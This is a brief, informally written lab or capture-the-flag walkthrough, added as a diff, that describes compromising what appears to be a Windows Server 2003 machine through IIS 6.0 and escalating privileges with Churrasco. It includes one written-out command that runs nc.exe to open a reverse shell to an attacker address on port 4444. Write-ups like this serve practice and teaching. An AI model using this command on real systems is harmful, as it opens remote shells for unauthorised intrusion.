@@ -1,0 +1,11 @@
+nmap said someting about dav .. but when we did all test failed
+
+then i looked at IIS6.0 and it gave me a shell
+
+now setimpersonat was enabled so i did juicypotato but it didnot worked
+
+as the machine was of 2003 so we did churassco
+
+`churrasco.exe -d "C:\wmpub\wmiislog\nc.exe -e cmd.exe 10.10.14.10 4444"`
+
+and it gave me shell
